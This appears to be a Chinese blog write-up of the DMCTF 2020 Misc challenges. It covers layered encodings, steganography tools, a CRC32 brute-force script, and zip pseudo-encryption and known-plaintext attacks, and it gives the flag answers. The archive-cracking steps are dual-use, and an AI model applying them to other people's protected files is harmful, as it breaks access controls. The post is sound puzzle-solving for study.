family\n\n题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：`base16`、`base32`、`base58`、`base64`、`base91`。还有几种没听过的base种类可以在这个网站找到：[CTF在线工具](http://ctf.ssleye.com/)。\n\n**原层**：\n\n```\nXUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td\"^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&GP<Rk:o_Jk<J.zp8%H0g7sYSTJ9p.\"duRBGj`g0!I+xjm(fh)]IF:>omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=<D\n```\n\n**base91解码**：\n\n```\n3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW\n```\n\n**base58解码**：\n\n```\nJZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5\n```\n\n**base32解码**：\n\n```\nNjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=\n```\n\n**base64解码**：\n\n```\n666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d\n```\n\n**hex解码**：\n\n```\nflag{y0u_alr3ady_kn0w_th3_Basefam1ly}\n```\n\n## SlientEye\n\n根据题目直接百度**SlientEye**，下载以后打开图片-->decode：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130105145.png)\n\n参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：\n\n```html\n&#102;&#108;&#97;&#103;&#123;&#110;&#49;&#95;&#98;&#117;&#95;&#106;&#49;&#97;&#110;&#103;&#95;&#119;&#117;&#95;&#100;&#51;&#125;\n```\n\n再去百度搜到一篇博客：[&#x开头的是什么编码?](https://www.cnblogs.com/philipding/p/10153094.html)，~~我点开一看，哦，原来是~~entity code实体编码，~~我啪的一下就~~把flag.txt改为flag.html，~~很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳~~打开flag.html获得flag：**flag{n1_bu_j1ang_wu_d3}**\n\n## 编码之王\n\n下载文件打开后一堆社会主义核心价值观，前面提到的：[CTF在线工具](http://ctf.ssleye.com/)就有核心价值观编码，下面放密文，上面是解码内容。\n\n解出来以后看到第一句：`如是我闻:`，-->[与佛论禅](http://www.keyfc.net/bbs/tools/tudoucode.aspx)\n\n再解之后看第一句：`新佛曰：`。-->[新与佛论禅](http://hi.pcmoe.net/buddha.html)\n\n解完以后直接出了一堆由：`[、]、!、+、(、)`组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130110943.png)\n\n## jpgsteg\n\n题目即是用到的工具，百度下载软件，使用jphide.exe打开图片`Tap code.jpg`，选择seek功能解密，密码为123456（我蒙的）：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111311.png)\n\n成功解密后获得一个文档，内容如下：\n\n```\n... ....\n.. ...\n.. ...\n. .\n... ..\n. .\n..... .....\n.. ....\n... ...\n.. ..\n\n```\n\n这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的`.`分成两部分代表坐标\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111538.png)\n\n解码得到：`ohhamazing` ，加上括号就是：**flag{ohhamazing}**\n\n事后多看了一眼图片命名：`Tap code.jpg`。这用啥解密不就在脸上写着的~~wosabi \\0/~~。。。\n\n## Collision\n\n打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201102424.png)\n\n所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：[crc32碰撞 ctf python](https://blog.csdn.net/weixin_45396639/article/details/103393759)作者原创的脚本：\n\n```python\nimport string\nimport threading\nimport binascii\nimport sys\n\n\ndef crc(_crc):\n    l = 1\n    dic = string.printable\n    _input = _crc\n    _input = \"0X\" + _input\n    for i in dic:\n        for n in dic:\n            for h in dic:\n                for m in dic:\n                    s = i + n + h + m\n                    s = s.encode()\n                    # print(str(binascii.crc32(s)), _input)\n                    if hex(binascii.crc32(s)).upper() == _input.upper():\n                        print(_crc, ':', s.decode())\n                        print(l)\n                        sys.exit()  #直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复\n                    l = l + 1\n\n\ndef crc32():\n    print(\"四字节碰撞!!!\")\n    num = int(input(\"你可能需要多个线程同时进行碰撞，请输入线程数：\"))\n    _thread = []\n    _args = []\n    print(\"输入参数\")\n    for i in range(num):\n        print(i+1, end=':')\n        _args.append(input())\n    # print(_args)\n    for i in range(num):\n        t = threading.Thread(target=crc, args=(_args[i],))\n        _thread.append(t) #如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试\n    # print(_thread)\n    for i in range(num):\n        _thread[i].start()\n    for i in range(num):\n        _thread[i].join()\n    input()\n\n\nif __name__ == '__main__':\n    crc32()\n```\n\n使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为：\n\n```\nff92876d\n6c4a558b\n77e8fd00\n1e59a66e\nd1f4eb9a\n```\n\n碰撞以后获得的明文：\n\n```\n1on}\n32co\nllis\nflag\n{crc\n```\n\n根据flag的结构拼接一下：**flag{crc32collis1on}**\n\n## kaomoji\n\n题目的压缩包解压以后得到一个**flag.zip**压缩包和**secret.txt**，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用**winrar**压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201103227.png)\n\n配合ARCHPR使用明文攻击，获得加密密钥： **[b00df998 5bdbbde6 485fa1f8\\]**\n\n我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包**flag_decrypted.zip**，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3}\n\n## ARCHPR\n\n题目根据提示：**This file was encrypted by me with a four-digit password, try to crack it!**\n\n密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下：\n\n```hint.txt\nThe flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.\n\nkey: .--. .- ... ... .-- --- .-. -..\n```\n\n提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：`password`，使用LSB（[项目地址](https://github.com/livz/cloacked-pixel)）脚本执行：\n\n```\npython lsb.py extract flag.png 1.txt password\n```\n\n**1.txt**中就包含了解密以后的flag：**flag{th1s_15_f1agggggg}**\n\n## outguess\n\n​\t看题目找工具，使用outguess参考[隐写工具outguess 的下载安装及使用](https://blog.csdn.net/weixin_43877387/article/details/103123858)，在kali中安装以后执行\n\n```\noutguess -r flag.jpg hide.txt\n```\n\n获得hide.txt文件的内容：\n\n```\nQb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg!\n\n\nEncrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+\n```\n\n上面一段使用**凯撒密码**移动13位获得：**Do you know AES? The key is s3cur1ty, go and crack it!**\n\n其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是`s3cur1ty`，获得flag：**flag{y0u_ar3_awes0m3}**\n\n解密网站：https://tool.oschina.net/encrypt\n\n## Whitespace\n\n题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201104847.png)\n\n这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。\n\n在[whitespace](https://vii5ard.github.io/whitespace)网站中粘贴密文点上面的`run`：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105235.png)\n\n解密获得：**password is BlindWaterMark!**\n\n输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt：\n\n```hint.txt\nDo you see any difference between the two pictures?\nGet to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding.\n\n\n上传文档\n你看这两幅画有什么不同吗？\n了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。\n```\n\n根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了**盲水印**技术，使用盲水印解密图片，项目地址：https://github.com/chishaxie/BlindWaterMark，执行：\n\n```\npython bwn.py decode 2.png 1.png 3.png \n```\n\n获得解密图片：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105728.png)\n\n图片中的内容为：\n\n```\n296969a5695\n6696a6a9a69\n5669595a566\n965696666aa\n69596a9666a\na6a6569955a\n5a66aa69a56\n9566a6a6aa6\n```\n\n就百度曼切斯特编码解码，找到一篇博客：[一些CTF编码脚本](https://blog.csdn.net/weixin_30416871/article/details/98566881)，在里面找到了这两段：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105901.png)\n\n心里一顿狂喜，因为都是`2965a`这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本\n\n```\nimport sys\ns = '296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6'  #这是前面图片里的内容\n\ns=bin(int(s,16))\nr=\"\"\nfor i in range(len(s)/2):\n    if s[i*2:i*2+2] == '10':\n        r += '1'\n    else:\n        r += '0'\nprint hex(int(r,2))[2:-1].decode('hex')\n```\n\n执行脚本后获得flag：**flag{ab1de_by_th3_law}**\n\n## Steghide\n\n题目即工具。参考博客[隐写工具Steghide](https://www.jianshu.com/p/c3679f805a0c)，在kali中安装Steghide后执行：\n\n```\nsteghide.exe extract -sf trump.jpg\n```\n\n会提示`Enter passphrase:`直接回车表示空密码，获得flag.txt，打开以后里面都是由`¿ ¡ .`组成的密文，和**Ook**的另一种编码：**short Ook**类似也是只用`? ! .`组成，把叹号和问号全部替换反过来`¡--->!  ¿--->?`，替换之后在线解码：https://www.splitbrain.org/services/ook，获得flag：**flag{y0u_ar3_clev3r}**\n\n## SSTV\n\n题目既是工具。搜索SSTV百度百科：\n\n> 慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。\n\n了解到是一种无线电传递图片的方法，搜到的博客[慢扫描电视 SSTV](https://blog.csdn.net/zkf0100007/article/details/83387790)和B站的视频[慢扫描电视SSTV](https://www.bilibili.com/video/BV1ea4y1J787)，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：**DMCTF{SSTV,yyds?}**\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201111538.png)\n\n## SimpleQrcode\n\n​\t下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）：\n\n```\nDM\nCT\nF{\nQr\nCo\nde\n_1\ns_\nso\n_i\nnt\ner\nes\nti\nng\n!!\n!}\n```\n\n参考下题目标题和flag格式，拼接后获得flag：**DMCTF{QrCode_1s_so_interesting!!!}**\n","source":"_posts/DMCTF之Misc.md","raw":"---\ntitle: DMCTF之Misc\ncategories:\n- CTF\ntags:\n- DMCTF2020\n- Misc\ncover: 'https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232221.png'\ndate: 2020-12-01 11:20:45\n---\n\n\n# 前言\n\n这次比赛是第一次做Mics的题awa。\n\n# Misc\n\n## Check_in\n\n真·有手就行\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130102716.png)\n\n## fakezip\n\n看到题目**fakezip**翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：[zip伪加密](https://blog.csdn.net/u011377996/article/details/79286958)，使用010 Editor打开压缩包，\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130103932.png)\n\n找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt\n\n打开以后内容是：`♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=`，音符加密虽然是第一次听说，但是百度还是可以简单找到：[文本加密为音乐符号](https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130104321.png)\n\n## Base family\n\n题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：`base16`、`base32`、`base58`、`base64`、`base91`。还有几种没听过的base种类可以在这个网站找到：[CTF在线工具](http://ctf.ssleye.com/)。\n\n**原层**：\n\n```\nXUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td\"^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&GP<Rk:o_Jk<J.zp8%H0g7sYSTJ9p.\"duRBGj`g0!I+xjm(fh)]IF:>omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=<D\n```\n\n**base91解码**：\n\n```\n3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW\n```\n\n**base58解码**：\n\n```\nJZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5\n```\n\n**base32解码**：\n\n```\nNjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=\n```\n\n**base64解码**：\n\n```\n666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d\n```\n\n**hex解码**：\n\n```\nflag{y0u_alr3ady_kn0w_th3_Basefam1ly}\n```\n\n## SlientEye\n\n根据题目直接百度**SlientEye**，下载以后打开图片-->decode：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130105145.png)\n\n参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：\n\n```html\n&#102;&#108;&#97;&#103;&#123;&#110;&#49;&#95;&#98;&#117;&#95;&#106;&#49;&#97;&#110;&#103;&#95;&#119;&#117;&#95;&#100;&#51;&#125;\n```\n\n再去百度搜到一篇博客：[&#x开头的是什么编码?](https://www.cnblogs.com/philipding/p/10153094.html)，~~我点开一看，哦，原来是~~entity code实体编码，~~我啪的一下就~~把flag.txt改为flag.html，~~很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳~~打开flag.html获得flag：**flag{n1_bu_j1ang_wu_d3}**\n\n## 编码之王\n\n下载文件打开后一堆社会主义核心价值观，前面提到的：[CTF在线工具](http://ctf.ssleye.com/)就有核心价值观编码，下面放密文，上面是解码内容。\n\n解出来以后看到第一句：`如是我闻:`，-->[与佛论禅](http://www.keyfc.net/bbs/tools/tudoucode.aspx)\n\n再解之后看第一句：`新佛曰：`。-->[新与佛论禅](http://hi.pcmoe.net/buddha.html)\n\n解完以后直接出了一堆由：`[、]、!、+、(、)`组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130110943.png)\n\n## jpgsteg\n\n题目即是用到的工具，百度下载软件，使用jphide.exe打开图片`Tap code.jpg`，选择seek功能解密，密码为123456（我蒙的）：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111311.png)\n\n成功解密后获得一个文档，内容如下：\n\n```\n... ....\n.. ...\n.. ...\n. .\n... ..\n. .\n..... .....\n.. ....\n... ...\n.. ..\n\n```\n\n这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的`.`分成两部分代表坐标\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111538.png)\n\n解码得到：`ohhamazing` ，加上括号就是：**flag{ohhamazing}**\n\n事后多看了一眼图片命名：`Tap code.jpg`。这用啥解密不就在脸上写着的~~wosabi \\0/~~。。。\n\n## Collision\n\n打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201102424.png)\n\n所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：[crc32碰撞 ctf python](https://blog.csdn.net/weixin_45396639/article/details/103393759)作者原创的脚本：\n\n```python\nimport string\nimport threading\nimport binascii\nimport sys\n\n\ndef crc(_crc):\n    l = 1\n    dic = string.printable\n    _input = _crc\n    _input = \"0X\" + _input\n    for i in dic:\n        for n in dic:\n            for h in dic:\n                for m in dic:\n                    s = i + n + h + m\n                    s = s.encode()\n                    # print(str(binascii.crc32(s)), _input)\n                    if hex(binascii.crc32(s)).upper() == _input.upper():\n                        print(_crc, ':', s.decode())\n                        print(l)\n                        sys.exit()  #直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复\n                    l = l + 1\n\n\ndef crc32():\n    print(\"四字节碰撞!!!\")\n    num = int(input(\"你可能需要多个线程同时进行碰撞，请输入线程数：\"))\n    _thread = []\n    _args = []\n    print(\"输入参数\")\n    for i in range(num):\n        print(i+1, end=':')\n        _args.append(input())\n    # print(_args)\n    for i in range(num):\n        t = threading.Thread(target=crc, args=(_args[i],))\n        _thread.append(t) #如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试\n    # print(_thread)\n    for i in range(num):\n        _thread[i].start()\n    for i in range(num):\n        _thread[i].join()\n    input()\n\n\nif __name__ == '__main__':\n    crc32()\n```\n\n使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为：\n\n```\nff92876d\n6c4a558b\n77e8fd00\n1e59a66e\nd1f4eb9a\n```\n\n碰撞以后获得的明文：\n\n```\n1on}\n32co\nllis\nflag\n{crc\n```\n\n根据flag的结构拼接一下：**flag{crc32collis1on}**\n\n## kaomoji\n\n题目的压缩包解压以后得到一个**flag.zip**压缩包和**secret.txt**，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用**winrar**压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201103227.png)\n\n配合ARCHPR使用明文攻击，获得加密密钥： **[b00df998 5bdbbde6 485fa1f8\\]**\n\n我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包**flag_decrypted.zip**，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3}\n\n## ARCHPR\n\n题目根据提示：**This file was encrypted by me with a four-digit password, try to crack it!**\n\n密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下：\n\n```hint.txt\nThe flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.\n\nkey: .--. .- ... ... .-- --- .-. -..\n```\n\n提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：`password`，使用LSB（[项目地址](https://github.com/livz/cloacked-pixel)）脚本执行：\n\n```\npython lsb.py extract flag.png 1.txt password\n```\n\n**1.txt**中就包含了解密以后的flag：**flag{th1s_15_f1agggggg}**\n\n## outguess\n\n​\t看题目找工具，使用outguess参考[隐写工具outguess 的下载安装及使用](https://blog.csdn.net/weixin_43877387/article/details/103123858)，在kali中安装以后执行\n\n```\noutguess -r flag.jpg hide.txt\n```\n\n获得hide.txt文件的内容：\n\n```\nQb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg!\n\n\nEncrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+\n```\n\n上面一段使用**凯撒密码**移动13位获得：**Do you know AES? The key is s3cur1ty, go and crack it!**\n\n其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是`s3cur1ty`，获得flag：**flag{y0u_ar3_awes0m3}**\n\n解密网站：https://tool.oschina.net/encrypt\n\n## Whitespace\n\n题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201104847.png)\n\n这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。\n\n在[whitespace](https://vii5ard.github.io/whitespace)网站中粘贴密文点上面的`run`：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105235.png)\n\n解密获得：**password is BlindWaterMark!**\n\n输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt：\n\n```hint.txt\nDo you see any difference between the two pictures?\nGet to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding.\n\n\n上传文档\n你看这两幅画有什么不同吗？\n了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。\n```\n\n根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了**盲水印**技术，使用盲水印解密图片，项目地址：https://github.com/chishaxie/BlindWaterMark，执行：\n\n```\npython bwn.py decode 2.png 1.png 3.png \n```\n\n获得解密图片：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105728.png)\n\n图片中的内容为：\n\n```\n296969a5695\n6696a6a9a69\n5669595a566\n965696666aa\n69596a9666a\na6a6569955a\n5a66aa69a56\n9566a6a6aa6\n```\n\n就百度曼切斯特编码解码，找到一篇博客：[一些CTF编码脚本](https://blog.csdn.net/weixin_30416871/article/details/98566881)，在里面找到了这两段：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105901.png)\n\n心里一顿狂喜，因为都是`2965a`这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本\n\n```\nimport sys\ns = '296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6'  #这是前面图片里的内容\n\ns=bin(int(s,16))\nr=\"\"\nfor i in range(len(s)/2):\n    if s[i*2:i*2+2] == '10':\n        r += '1'\n    else:\n        r += '0'\nprint hex(int(r,2))[2:-1].decode('hex')\n```\n\n执行脚本后获得flag：**flag{ab1de_by_th3_law}**\n\n## Steghide\n\n题目即工具。参考博客[隐写工具Steghide](https://www.jianshu.com/p/c3679f805a0c)，在kali中安装Steghide后执行：\n\n```\nsteghide.exe extract -sf trump.jpg\n```\n\n会提示`Enter passphrase:`直接回车表示空密码，获得flag.txt，打开以后里面都是由`¿ ¡ .`组成的密文，和**Ook**的另一种编码：**short Ook**类似也是只用`? ! .`组成，把叹号和问号全部替换反过来`¡--->!  ¿--->?`，替换之后在线解码：https://www.splitbrain.org/services/ook，获得flag：**flag{y0u_ar3_clev3r}**\n\n## SSTV\n\n题目既是工具。搜索SSTV百度百科：\n\n> 慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。\n\n了解到是一种无线电传递图片的方法，搜到的博客[慢扫描电视 SSTV](https://blog.csdn.net/zkf0100007/article/details/83387790)和B站的视频[慢扫描电视SSTV](https://www.bilibili.com/video/BV1ea4y1J787)，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：**DMCTF{SSTV,yyds?}**\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201111538.png)\n\n## SimpleQrcode\n\n​\t下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）：\n\n```\nDM\nCT\nF{\nQr\nCo\nde\n_1\ns_\nso\n_i\nnt\ner\nes\nti\nng\n!!\n!}\n```\n\n参考下题目标题和flag格式，拼接后获得flag：**DMCTF{QrCode_1s_so_interesting!!!}**\n","slug":"DMCTF之Misc","published":1,"updated":"2021-12-30T09:42:54.175Z","_id":"ckrr3f9aj0003hotccw2y1mbp","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这次比赛是第一次做Mics的题awa。</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"Check-in\"><a href=\"#Check-in\" class=\"headerlink\" title=\"Check_in\"></a>Check_in</h2><p>真·有手就行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130102716.png\"></p>\n<h2 id=\"fakezip\"><a href=\"#fakezip\" class=\"headerlink\" title=\"fakezip\"></a>fakezip</h2><p>看到题目<strong>fakezip</strong>翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：<a href=\"https://blog.csdn.net/u011377996/article/details/79286958\">zip伪加密</a>，使用010 Editor打开压缩包，</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130103932.png\"></p>\n<p>找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt</p>\n<p>打开以后内容是：<code>♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=</code>，音符加密虽然是第一次听说，但是百度还是可以简单找到：<a href=\"https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue\">文本加密为音乐符号</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130104321.png\"></p>\n<h2 id=\"Base-family\"><a href=\"#Base-family\" class=\"headerlink\" title=\"Base family\"></a>Base family</h2><p>题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：<code>base16</code>、<code>base32</code>、<code>base58</code>、<code>base64</code>、<code>base91</code>。还有几种没听过的base种类可以在这个网站找到：<a href=\"http://ctf.ssleye.com/\">CTF在线工具</a>。</p>\n<p><strong>原层</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XUZbB&#123;fp&#125;U)=ql[n%GCbk9RZ7!XD$D)f1G&#123;011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I&#125;^8jjP|0&amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&quot;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN&#125;8DmJf&amp;GP&lt;Rk:o_Jk&lt;J.zp8%H0g7sYSTJ9p.&quot;duRBGj`g0!I+xjm(fh)]IF:&gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu&#125;%_=&lt;D</span><br></pre></td></tr></table></figure>\n\n<p><strong>base91解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 